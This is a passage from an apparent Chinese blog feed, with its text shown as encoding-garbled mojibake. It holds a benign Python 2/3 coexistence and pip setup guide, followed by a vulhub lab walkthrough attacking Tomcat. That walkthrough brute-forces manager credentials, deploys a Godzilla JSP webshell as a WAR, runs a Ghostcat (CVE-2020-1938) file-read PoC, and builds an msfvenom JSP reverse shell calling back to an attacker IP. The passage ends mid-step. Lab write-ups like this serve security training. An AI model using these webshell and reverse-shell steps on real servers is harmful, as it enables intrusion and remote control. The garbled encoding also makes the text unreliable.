·çš„ã€‚</p><p>æ‰€ä»¥ä¸Šä¸‹åŒºåˆ«ä¸å¤§ï¼Œé€‰å“ªä¸ªéƒ½è¡Œï¼Œä¾å®é™…æƒ…å†µè€Œå®šã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724183120895-1671717632.png" alt="img"></p><p>è¿™é‡Œå°½é‡ä¸è¦å®‰è£…åœ¨cç›˜ï¼Œå®‰è£…åœ¨ä¸Šé¢å»ºç«‹çš„python2æ–‡ä»¶å¤¹ä¸­ï¼Œä¹‹åNextä¸‹ä¸€æ­¥ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724183924937-1869909986.png" alt="img"></p><p>çº¢è‰²æ¡†å†…æˆ‘ä»¬ä¸ç”¨ç®¡å®ƒï¼Œè¿™æ˜¯å› ä¸ºä¸Šé¢å®‰è£…python3å·²ç»è‡ªåŠ¨æ·»åŠ äº†ç¯å¢ƒå˜é‡ï¼Œç»§ç»­å®‰è£…ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724185403604-1358730756.png" alt="img"></p><p>å®‰è£…å®Œæˆ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724185620961-1767052962.png" alt="img"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹python2å’Œpython3æ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œä¼šå‘ç°éƒ½å­˜åœ¨python.exeã€‚é‚£ä¹ˆè‚¯å®šä¸èƒ½æ˜¯åŒåçš„ï¼Œåç»­è¦ä¿®æ”¹çš„ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190440439-184478838.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/2370051/202107/2370051-20210724190614172-854278329.png" alt="img"></p><h3 id="é…ç½®ç¯å¢ƒå˜é‡">é…ç½®ç¯å¢ƒå˜é‡</h3><p>ç‚¹å‡»è¿›å…¥ç¯å¢ƒå˜é‡</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190800717-1450201625.png" alt="img"></p><p>ç¼–è¾‘pathå€¼ï¼Œç„¶åç‚¹å‡»ç¼–è¾‘æ–‡æœ¬</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190933370-1105442649.png" alt="img"></p><p>é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œåœ¨ç³»ç»Ÿå˜é‡ä¸­ç”±äºæ²¡æœ‰å®‰è£…Pythonçš„è·¯å¾„æ¡ç›®ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨é…ç½®ã€‚</p><p>æ‰¾åˆ°å®‰è£…pythonçš„è·¯å¾„å’Œå…¶è·¯å¾„åº•ä¸‹çš„scriptsè·¯å¾„ï¼Œæ¯”å¦‚ï¼šE:\python2\Scriptså’ŒE:\python2</p><p>ä¸‹é¢ä¸¤ç§æ–¹æ³•ï¼Œç¼–è¾‘é…ç½®ç¯å¢ƒå˜é‡ï¼š</p><p>1.æ–°å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒæŠŠåˆšåˆšå¤åˆ¶çš„pythonçš„è·¯å¾„å’Œå…¶è·¯å¾„åº•ä¸‹çš„scriptsè·¯å¾„ä¾æ¬¡åˆ›å»ºï¼Œæ–°å»ºçš„ç¯å¢ƒå˜é‡éƒ½ä¼šåœ¨æœ€ä¸‹é¢ï¼Œéœ€è¦æˆ‘ä»¬ä¸Šç§»åˆ°æœ€ä¸Šç«¯ã€‚</p><p>2.ç›´æ¥åœ¨æœ€å¼€å§‹ç¼–è¾‘æ–‡æœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724193849404-1457801460.png" alt="img"></p><p>ç¯å¢ƒå˜é‡é…ç½®å®Œåº”è¯¥æ˜¯è¿™æ ·</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724192805955-1278954775.png" alt="img"></p><p>æ³¨æ„æ³¨æ„ï¼<strong>é…ç½®å®Œä¸€å®šè¦ç‚¹è¿™ä¸ªç¡®å®šï¼å¦åˆ™ç®—æ²¡æœ‰é…ç½®æˆåŠŸï¼</strong></p><p><strong><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194122153-102162505.png" alt="img"></strong></p><p>é…ç½®å®Œç¯å¢ƒå˜é‡ä¹‹åï¼Œè¿›å…¥python2å’Œpython3æ ¹ç›®å½•ï¼Œåˆ†åˆ«ä¿®æ”¹python.exeåå­—ä¸ºpython2.exeå’Œpython3.exeï¼Œåˆ†åˆ«ä¿®æ”¹pythonw.exeåå­—ä¸ºpythonw2.exeå’Œpythonw3.exeã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194405858-318836222.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194442607-1292545240.png" alt="img"></p><p>æŒ‰â€œWin + Râ€å¿«æ·é”®ï¼Œåœ¨æ‰“å¼€çš„â€œè¿è¡Œâ€å¯¹è¯æ¡†ä¸­ï¼Œè¾“å…¥â€œcmdâ€æŒ‰å›è½¦ï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œè¾“å…¥python2æŸ¥çœ‹python2å®‰è£…æƒ…å†µï¼Œæ˜¾ç¤ºpython 2.7.18 çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ™å®‰è£…æˆåŠŸ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194626842-1184082555.png" alt="img"></p><p>å†æŒ‰â€œWin + Râ€å¿«æ·é”®ï¼Œåœ¨æ‰“å¼€çš„â€œè¿è¡Œâ€å¯¹è¯æ¡†ä¸­ï¼Œè¾“å…¥â€œcmdâ€æŒ‰å›è½¦ï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œè¾“å…¥python3æŸ¥çœ‹python3å®‰è£…æƒ…å†µï¼Œæ˜¾ç¤ºpython 3.9.4 çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ™å®‰è£…æˆåŠŸ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194829939-1008215687.png" alt="img"></p><h2 id="pipé…ç½®">pipé…ç½®</h2><p>Python å®‰è£…åŒ…éœ€è¦ç”¨åˆ°åŒ…ç®¡ç†å·¥å…·pipï¼Œä½†æ˜¯å½“åŒæ—¶å®‰è£…python2å’Œpython3çš„æ—¶å€™ï¼Œpipåªæ˜¯å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬ï¼Œä»¥ä¸‹å°†æä¾›ä¸€ä¸ªä¿®æ”¹æ–¹å¼ï¼Œå³é‡æ–°å®‰è£…ä¸¤ä¸ªç‰ˆæœ¬çš„pipï¼Œä½¿å¾—ä¸¤ä¸ªpythonç‰ˆæœ¬çš„pipèƒ½å¤Ÿå…±å­˜ã€‚</p><p>åœ¨å‘½ä»¤æç¤ºæ¡†è¾“å…¥å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¾¿æ˜¯å®‰è£…æˆåŠŸã€‚</p><p>å¦‚æœè¿™ä¸ªæŒ‡ä»¤æŠ¥é”™çš„è¯ï¼Œå»ºè®®æ¢è¿™ä¸ªè¯•è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip -i https://pypi.douban.com/simpleï¼ˆpipæºåœ¨å›½å¤–ï¼Œè¿èµ·æ¥æ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥å¯¼è‡´æœåŠ¡å™¨è¿æ¥è¶…æ—¶ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725204111046-883695211.png" alt="img"></p><p>æ¥ä¸‹æ¥ä¹Ÿæ˜¯åœ¨å‘½ä»¤æç¤ºæ¡†è¾“å…¥å‘½ä»¤ï¼Œå®‰è£…æˆåŠŸå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9be1da665188b1ab462a383362d82077.png" alt="img"></p><p>å®‰è£…å®Œæˆä¹‹åï¼Œå¯ä»¥ä½¿ç”¨pip2 -V æˆ–è€…pip3 -VæŸ¥çœ‹å¯¹åº”çš„pipç‰ˆæœ¬äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dbc2e2e7acd0e4919cbec38419cd1bf.png" alt="img"></p><h2 id="python2å®‰è£…-æ›´æ–°pipæ—¶å‡ºé”™é—®é¢˜è§£å†³">python2å®‰è£…/æ›´æ–°pipæ—¶å‡ºé”™é—®é¢˜è§£å†³</h2><h3 id="åˆ†æåŸå› ">åˆ†æåŸå› </h3><p>å‘ç°å®‰è£…å‡ºç°é—®é¢˜ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725204441354-2144440410.png" alt="img"></p><p>æŸ¥é˜…èµ„æ–™ï¼Œæ¨æµ‹å¯èƒ½æ˜¯å› ä¸ºpipæºåœ¨å›½å¤–ï¼Œè¿èµ·æ¥æ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥å¯¼è‡´æœåŠ¡å™¨è¿æ¥è¶…æ—¶ï¼Œè§£å†³æ–¹æ³•å¯ä»¥æ”¹ç”¨å›½å†…çš„æºã€‚</p><p>è¾“å…¥æŒ‡ä»¤ï¼špython2 -m pip install --upgrade pip -i <a href="https://pypi.douban.com/simple%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%8A%A5%E9%94%99%E3%80%82">https://pypi.douban.com/simpleï¼Œä¾æ—§æŠ¥é”™ã€‚</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725205019506-258609077.png" alt="img"></p><p>ç»§ç»­æŸ¥é˜…å…³äºpipå®‰è£…æŠ¥é”™çš„ç›¸å…³çŸ¥è¯†ï¼Œæ¨æµ‹å¯èƒ½æ˜¯ç”±äºpipå›¢é˜Ÿåœ¨2021å¹´1æœˆå‘å¸ƒçš„<code>pip 21.0ç‰ˆæœ¬å®Œå…¨</code>åœæ­¢äº†å¯¹Python 2.7çš„æ”¯æŒã€‚</p><p>æ‰€ä»¥åªèƒ½å¸è½½python2çš„pipï¼Œç„¶åé‡æ–°å®‰è£…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip uninstall pip</span><br></pre></td></tr></table></figure><p>å†é‡æ–°å®‰è£…pip</p><h3 id="å®‰è£…-pip2">å®‰è£… pip2</h3><h4 id="ä½¿ç”¨-Python-è‡ªå¸¦çš„-ensurepip-æ¨¡å—">ä½¿ç”¨ Python è‡ªå¸¦çš„ ensurepip æ¨¡å—</h4><p>Python 2.7 åŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼ŒPython è‡ªå¸¦äº†ä¸€ä¸ªåä¸º <code>ensurepip</code> çš„æ¨¡å—ï¼Œå¯ä»¥ç”¨æ¥å®‰è£… pipã€‚åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m ensurepip --upgrade</span><br></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤å°†è‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£… pipï¼Œå¹¶å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚</p><h4 id="ä½¿ç”¨-get-pip-py-è„šæœ¬">ä½¿ç”¨ <a href="http://get-pip.py">get-pip.py</a> è„šæœ¬</h4><p>å¦‚æœä¸Šè¿°æ–¹æ³•ä¸å¯è¡Œï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ <code>get-pip.py</code> è„šæœ¬æ‰‹åŠ¨å®‰è£… pipã€‚é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»ä¸‹è½½äº† Python 2.7 çš„å®‰è£…åŒ…ï¼Œå…¶ä¸­åŒ…å«äº† <code>get-pip.py</code> æ–‡ä»¶ã€‚ä¸‹è½½åœ°å€ä¸ºï¼š<a href="https://bootstrap.pypa.io/2.7/get-pip.py">https://bootstrap.pypa.io/2.7/get-pip.py</a></p><p>ç„¶åï¼Œåœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤å°†æ‰§è¡Œ <code>get-pip.py</code> è„šæœ¬ï¼Œè‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£… pipã€‚</p><h3 id="éªŒè¯-pip2-å®‰è£…">éªŒè¯ pip2 å®‰è£…</h3><p>å®‰è£…å®Œ pip2 åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤éªŒè¯ pip2 æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 --version</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å‡ºæ˜¾ç¤ºäº† pip2 çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ pip2 å·²ç»æˆåŠŸå®‰è£…ã€‚</p><p>ç„¶åé—®é¢˜å°±è§£å†³äº†ã€‚</p><h2 id="python2å’Œ3å…±å­˜åå¿…é¡»æŒ‡å®šç‰ˆæœ¬è€Œæ— æ³•ä½¿ç”¨â€œpythonâ€å‘½ä»¤é—®é¢˜è§£å†³">python2å’Œ3å…±å­˜åå¿…é¡»æŒ‡å®šç‰ˆæœ¬è€Œæ— æ³•ä½¿ç”¨â€œpythonâ€å‘½ä»¤é—®é¢˜è§£å†³</h2><p>è¿™æ˜¯å› ä¸ºä¹‹å‰ä¿®æ”¹äº†python.exeä¸ºpython2.exeå’Œpython3.exeï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä½¿ç”¨pythonã€‚</p><p>è§£å†³æ–¹æ³•å°±æ˜¯ï¼š</p><ol><li>æƒ³è®©â€pythonâ€œé»˜è®¤æŒ‡å‘python3ï¼Œå°±åœ¨python3æ–‡ä»¶ä¸­çš„python.exeå¤åˆ¶ä¸€ä»½ï¼Œç„¶åå†ä¿®æ”¹æˆpython3.exeï¼ˆå°±æ˜¯æ–‡ä»¶ä¸­åŒæ—¶å­˜åœ¨python.exeå’Œpython3.exeï¼‰</li><li>æƒ³è®©â€pythonâ€œé»˜è®¤æŒ‡å‘python2ï¼Œå°±åœ¨python2æ–‡ä»¶ä¸­çš„python.exeå¤åˆ¶ä¸€ä»½ï¼Œç„¶åå†ä¿®æ”¹æˆpython2.exeï¼ˆå°±æ˜¯æ–‡ä»¶ä¸­åŒæ—¶å­˜åœ¨python.exeå’Œpython2.exeï¼‰</li></ol><p>ä¹‹åå°±ä¼šé»˜è®¤æŒ‡å‘æŸä¸ªç‰ˆæœ¬äº†ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§winç³»ç»Ÿé…ç½®python2å’Œpython3å…±å­˜ä»¥åŠé…ç½®pipï¼›win10ç³»ç»Ÿä¸‹python2å’Œpython3å…±å­˜è®¾ç½®ï¼›win10ç³»ç»Ÿä¸‹python2å’Œpython3å…±å­˜ä»¥åŠpipé…ç½®é—®é¢˜ï¼›python2æ— æ³•æ›´æ–°/å®‰è£…pipé—®é¢˜è§£å†³ï¼›python2å’Œ3å…±å­˜åå¿…é¡»æŒ‡å®šç‰ˆæœ¬è€Œæ— æ³•ä½¿ç”¨â€œpythonâ€å‘½ä»¤é—®é¢˜è§£å†³</summary>
    
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´åŠæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/a96128fe.html"/>
    <id>https://blog.m3x1.cn/posts/a96128fe.html</id>
    <published>2025-03-27T16:00:00.000Z</published>
    <updated>2025-03-28T07:09:19.034Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="tomcat8">tomcat8</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>win10æ”»å‡»æœºï¼š192.168.192.129</p></blockquote><h3 id="ç¯å¢ƒè¯´æ˜">ç¯å¢ƒè¯´æ˜</h3><p>Tomcatæ”¯æŒåœ¨åå°éƒ¨ç½²waræ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°†webshelléƒ¨ç½²åˆ°webç›®å½•ä¸‹ã€‚å…¶ä¸­ï¼Œæ¬²è®¿é—®åå°ï¼Œéœ€è¦å¯¹åº”ç”¨æˆ·æœ‰ç›¸åº”æƒé™ã€‚</p><p>Tomcat7+æƒé™åˆ†ä¸ºï¼š</p><ul><li>managerï¼ˆåå°ç®¡ç†ï¼‰<ul><li>manager-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>manager-status æ‹¥æœ‰æŸ¥çœ‹statusçš„æƒé™</li><li>manager-script æ‹¥æœ‰textæ¥å£çš„æƒé™ï¼Œå’Œstatusæƒé™</li><li>manager-jmx æ‹¥æœ‰jmxæƒé™ï¼Œå’Œstatusæƒé™</li></ul></li><li>host-managerï¼ˆè™šæ‹Ÿä¸»æœºç®¡ç†ï¼‰<ul><li>admin-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>admin-script æ‹¥æœ‰textæ¥å£æƒé™</li></ul></li></ul><h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3><p>é¶æœºè¿›å…¥vulhub-master/tomcat/tomcat8,å¯åŠ¨docker</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326165628798.png" alt="image-20250326165628798"></p><p>å¼€å¯ç¯å¢ƒä¹‹åæµè§ˆå™¨æ‰“å¼€ï¼Œå¦‚æœä¸çŸ¥é“tomcatçš„åå°ç®¡ç†é¡µé¢ä¸ºmanagerçš„è¯ï¼Œåœ¨æœ¬ç¯å¢ƒä¸­ä¹Ÿå¯ä»¥è‡ªå·±æ‘¸ç´¢å‡ºç™»å½•æ¡†ï¼Œç‚¹å‡»å›¾ä¸­ä»»æ„ä¸‰ä¸ªè¯·æ±‚ä¹‹åä¹Ÿèƒ½å‘ç°ç™»å½•æ¡†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28ff0661acc62e0ea2101b28b2618fa2.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/415b65ab170d2bced11bac4a83b0dc4c.png" alt="img"></p><p>æ‰¾åˆ°ç™»å½•é¡µé¢ä¹‹åå°è¯•tomcatçš„å¼±å£ä»¤,å…ˆæŠ“åŒ…å‘ç°ä¸€ä¸ªbaseç¼–ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103117221.png" alt="image-20250327103117221"></p><p>è§£ç å‘ç°ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103239255.png" alt="image-20250327103239255"></p><p>ç„¶åçŸ¥é“äº†ä»–ä¼ é€’è´¦æˆ·å¯†ç çš„æ–¹å¼ï¼Œå°±å¯ä»¥è¿›è¡Œçˆ†ç ´äº†</p><p>çˆ†ç ´å‡ºæ¥æ˜¯tomcat:tomcat</p><p>ä¹‹åå°±å‘ç°å¯ä»¥è¿›è¡Œä¸Šä¼ æ–‡ä»¶çš„æ“ä½œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c38eb17fb273c5faedc1f3a0fab82ee.png" alt="img"></p><p>æ¥ä¸‹æ¥å…ˆç”¨å“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªjspæ–‡ä»¶</p><p>ç„¶åç”¨javaå‘½ä»¤ï¼Œå°†å®ƒæ‰“åŒ…æˆwaræ ¼å¼ï¼šï¼ˆæˆ–è€…å°†jspæ–‡ä»¶å‹ç¼©æˆzipæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸ºwarï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111550121.png" alt="image-20250327111550121"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111635208.png" alt="image-20250327111635208"></p><p>ä¸Šä¼ waråŒ…getshellï¼Œä¸Šä¼ å®Œæˆä¹‹åå°±å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€æ æ•°æ®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7b396b9105f6d2d1b7ffa12aaa272cb9.png" alt="img"></p><p>ç„¶åè®¿é—®è·¯å¾„ä¸º/shell/shell.jspï¼Œå¦‚æœèƒ½è®¿é—®æˆåŠŸï¼Œå°±è¯´æ˜æˆåŠŸäº†ã€‚</p><p>æ‰“å¼€å“¥æ–¯æ‹‰è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸæ‹¿åˆ°shell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112003498.png" alt="image-20250327112003498"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112312284.png" alt="image-20250327112312284"></p><h2 id="CVE-2020-1938">CVE-2020-1938</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.133</p></blockquote><p>Tomcat æ˜¯å½“å‰æœ€æµè¡Œçš„ Java ä¸­é—´ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼Œä»åˆç‰ˆå‘å¸ƒåˆ°ç°åœ¨å·²ç»æœ‰äºŒåå¤šå¹´å†å²ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…å¹¿æ³›ä½¿ç”¨ã€‚Ghostcatæ˜¯ç”±é•¿äº­ç§‘æŠ€å®‰å…¨ç ”ç©¶å‘˜å‘ç°çš„å­˜åœ¨äº Tomcat ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç”±äº Tomcat AJP åè®®è®¾è®¡ä¸Šå­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…é€šè¿‡ Tomcat AJP Connector å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥è¯»å– webapp é…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚æ­¤å¤–åœ¨ç›®æ ‡åº”ç”¨æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œé…åˆæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨è¿˜å¯ä»¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„å±å®³ã€‚</p><p>tomcat é…ç½®äº†ä¸¤ä¸ªConnectoï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ HTTP å’Œ AJP ï¼šHTTPé»˜è®¤ç«¯å£ä¸º8080ï¼Œå¤„ç†httpè¯·æ±‚ï¼Œè€ŒAJPé»˜è®¤ç«¯å£8009ï¼Œç”¨äºå¤„ç† AJP åè®®çš„è¯·æ±‚ï¼Œè€ŒAJPæ¯”httpæ›´åŠ ä¼˜åŒ–ï¼Œå¤šç”¨äºåå‘ã€é›†ç¾¤ç­‰ï¼Œæ¼æ´ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ä»¥åŠå¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶ï¼Œå¦‚æœæœ‰æŸä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ç­‰ç­‰ï¼Œå³å¯ä»¥è·å–shellã€‚</p><p>ç¯å¢ƒå¯åŠ¨ä¹‹åï¼Œè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327202910328.png" alt="image-20250327202910328"></p><p>çœ‹åˆ°æœ‰ä¸ªé™Œç”Ÿçš„ajp13åè®®ï¼Œæœç´¢å¾—çŸ¥è¿™æ˜¯ä¸ªå®šå‘åŒ…åè®®ã€‚å› ä¸ºæ€§èƒ½åŸå› ï¼Œä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼æ¥ä¼ è¾“å¯è¯»æ€§æ–‡æœ¬ã€‚</p><blockquote><p><strong>AJP13</strong>æ˜¯Apache Tomcatä¸­ä½¿ç”¨çš„ä¸€ç§é«˜æ•ˆçš„äºŒè¿›åˆ¶åè®®ï¼Œå®ƒå…è®¸WebæœåŠ¡å™¨ä¸Servletå®¹å™¨ä¹‹é—´é€šè¿‡TCPè¿æ¥è¿›è¡Œé€šä¿¡ã€‚è¿™ç§åè®®çš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼Œå› ä¸ºå®ƒä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼ä¼ è¾“å¯è¯»æ€§æ–‡æœ¬ï¼Œä»è€Œå‡å°‘äº†å¤„ç†socketè¿æ¥çš„å¼€é”€ã€‚åœ¨AJP13åè®®ä¸­ï¼ŒWebæœåŠ¡å™¨å’ŒServletå®¹å™¨ä¹‹é—´å°è¯•ä¿æŒæŒä¹…æ€§çš„TCPè¿æ¥ï¼Œä»¥ä¾¿åœ¨å¤šä¸ªè¯·æ±‚/å“åº”å¾ªç¯ä¸­é‡ç”¨åŒä¸€ä¸ªè¿æ¥ã€‚è¿™æ„å‘³ç€ï¼Œä¸€æ—¦è¿æ¥è¢«åˆ†é…ç»™ç‰¹å®šè¯·æ±‚ï¼Œåœ¨è¯·æ±‚å¤„ç†ç»“æŸä¹‹å‰ï¼Œè¯¥è¿æ¥ä¸ä¼šå†æ¬¡åˆ†é…ç»™å…¶ä»–è¯·æ±‚ã€‚</p></blockquote><p>è®¿é—®8080ç«¯å£ï¼Œæ˜¯ä¸ªtomcatçš„é¡µé¢ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨pocè¿›è¡Œæ¼æ´æ£€æµ‹ã€‚è‹¥å­˜åœ¨æ¼æ´åˆ™å¯ä»¥æŸ¥çœ‹webappsç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/æ–‡ä»¶å é¶æœºip   #py2ç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327204718269.png" alt="image-20250327204718269"></p><p>çœ‹åˆ°èƒ½æˆåŠŸè¯»å–web.xmlæ–‡ä»¶ï¼Œå°±æ˜¯éªŒè¯äº†æ¼æ´å­˜åœ¨ã€‚</p><p>éªŒè¯å®Œæˆä¹‹åå°±å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨çš„æ“ä½œäº†</p><p>å…ˆåœ¨é¶æœºåˆ©ç”¨msfç”Ÿæˆä¸€ä¸ªjspæœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.192.133 LPORT=4444 R &gt;shell.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205509964.png" alt="image-20250327205509964"></p><p>æ¥ç€æŠŠæœ¨é©¬ä¸Šä¼ åˆ°dockerå®¹å™¨ä¸­</p><figure class="highlight plaintext"><table><tr><td 